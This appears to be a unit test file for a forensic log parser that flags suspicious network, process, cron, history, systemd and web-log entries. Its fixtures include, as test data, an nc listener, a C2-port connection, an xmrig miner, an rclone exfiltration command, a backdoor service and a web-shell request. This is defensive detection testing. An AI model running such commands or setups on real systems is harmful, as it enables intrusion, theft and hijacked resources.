from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from uac_parser.parsers.network import parse_netstat, parse_ss
from uac_parser.parsers.processes import parse_ps
from uac_parser.parsers.simple import (
    parse_cron,
    parse_package_log,
    parse_shell_history,
    parse_systemd,
    parse_web_log,
)
from uac_parser.parsers.syslog import parse as parse_syslog


class RuntimeParserTests(unittest.TestCase):
    def _file(self, root: Path, name: str, content: str) -> Path:
        path = root / name
        path.write_text(content, encoding="utf-8")
        return path

    def test_socket_parsers_classify_listeners_and_connection_direction(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            ss = self._file(
                root,
                "ss.txt",
                'LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=42,fd=3))\n'
                'ESTAB 0 0 10.0.0.5:53000 198.51.100.20:22 users:(("ssh",pid=50,fd=4))\n'
                "not a socket row\n",
            )
            netstat = self._file(
                root,
                "netstat.txt",
                "tcp 0 0 10.0.0.5:22 198.51.100.30:55000 ESTABLISHED 60/sshd\n"
                "tcp 0 0 10.0.0.5:54000 198.51.100.40:31337 ESTABLISHED 61/python\n",
            )

            events = parse_ss(ss, "ss.txt") + parse_netstat(netstat, "netstat.txt")

        listener = next(
            event for event in events if event.event_action == "listening_port"
        )
        outbound_ssh = next(
            event
            for event in events
            if "outbound_ssh_connection" in event.detection_names
        )
        inbound = next(
            event for event in events if event.event_action == "inbound_connection"
        )
        c2 = next(
            event
            for event in events
            if "outbound_suspicious_port" in event.detection_names
        )
        self.assertEqual(listener.severity, "high")
        self.assertEqual(listener.process, "nc")
        self.assertEqual(outbound_ssh.mitre, ["T1021.004"])
        self.assertEqual(inbound.src_ip, "198.51.100.30")
        self.assertIn("c2_candidate", c2.tags)

    def test_process_parser_emits_only_suspicious_processes(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            path = self._file(
                Path(directory),
                "ps.txt",
                "root 123 0.0 0.1 1000 100 ? S 10:00 00:00 /tmp/xmrig --donate-level 0\n"
                "alice 124 0.0 0.1 1000 100 ? S 10:00 00:00 /usr/bin/sleep 10\n"
                "malformed row\n",
            )
            events = parse_ps(path, "ps.txt")

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].severity, "high")
        self.assertIn("suspicious_process", events[0].detection_names)
        self.assertIn("root_process_from_unusual_path", events[0].detection_names)

    def test_simple_parsers_preserve_timestamps_and_attack_context(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            cron = self._file(
                root,
                "cron.log",
                "Jun 16 10:00:01 host CRON[1]: (root) CMD (/tmp/job)\ninvalid\n",
            )
            history = self._file(
                root, "history", "#1718532000\nrclone copy /srv remote:case\n\nwhoami\n"
            )
            packages = self._file(
                root,
                "packages.log",
                "2026-06-16T10:00:01Z installed tunnel-agent\ninvalid\n",
            )
            unit = self._file(
                root, "backdoor.service", "[Service]\nExecStart=/dev/shm/agent\n"
            )
            web = self._file(
                root,
                "access.log",
                '198.51.100.50 - - [16/Jun/2026:10:00:01 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 42\nbenign malformed\n',
            )
            syslog = self._file(
                root,
                "syslog",
                "Jun 16 10:00:01 host systemd[1]: Started Backup Service\n"
                "Jun 16 10:00:02 host CRON[2]: task\n"
                "Jun 16 10:00:03 host app[3]: ignored\n",
            )

            cron_events = parse_cron(cron, "cron.log", year=2026)
            history_events = parse_shell_history(history, "history")
            package_events = parse_package_log(packages, "packages.log")
            unit_events = parse_systemd(unit, "backdoor.service")
            web_events = parse_web_log(web, "access.log", year=2026)
            syslog_events = parse_syslog(syslog, "syslog", year=2026)

        self.assertEqual(len(cron_events), 1)
        self.assertEqual(history_events[0].timestamp_type, "command_time")
        self.assertEqual(history_events[1].timestamp_type, "unknown")
        self.assertEqual(package_events[0].event_action, "package_installed")
        self.assertEqual(unit_events[0].event_action, "systemd_service_definition")
        self.assertEqual(web_events[0].severity, "medium")
        self.assertIn("web_attack_candidate", web_events[0].tags)
        self.assertEqual(
            {event.event_action for event in syslog_events},
            {"service_started", "cron_execution"},
        )


if __name__ == "__main__":
    unittest.main()
